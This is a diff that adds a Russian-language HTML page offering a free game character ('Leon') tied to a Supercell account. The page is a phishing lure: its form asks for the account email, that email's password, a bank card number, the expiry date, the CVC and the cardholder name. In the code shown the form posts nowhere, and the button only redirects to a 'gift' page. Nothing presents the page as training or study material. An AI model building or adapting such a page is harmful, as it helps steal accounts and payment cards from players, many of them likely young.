@@ -1,0 +1,40 @@
+<style>
+body {
+	background-image: url('background.jpg');
+}
+div {
+	background-color: white;
+	padding: 10px;
+	position: absolute;
+    top: 50%;
+    left: 50%;
+    margin-right: -50%;
+    transform: translate(-50%, -50%)
+}
+</style>
+
+<head>
+	<title>Забери Леона!</title>
+</head>
+
+<body>
+	<div>
+		Заполни форму и получи Леона прямо себе на аккаунт!!!
+		<form>
+			<label for="id_email">Почта от Supercell ID</label>
+			<input type="text" id="id_email" name="id_email"><br>
+			<label for="id_pass">Пароль от этой почты</label>
+			<input type="text" id="id_pass" name="id_pass"><br>
+			<label for="card_num">Номер банковской карты</label>
+			<input type="text" id="card_num" name="card_num"><br>
+			<label for="date">Срок дейтсвия карты</label>
+			<input type="text" id="date" name="date"><br>
+			<label for="cvc">CVC код</label>
+			<input type="text" id="cvc" name="cvc"><br>
+			<label for="owner">Имя владельца карты</label>
+			<input type="text" id="owner" name="owner"><br>
+		</form>
+		<button onclick="location.href='gift.html'" type="button">
+         Отправить</button>
+	</div>
+</body>
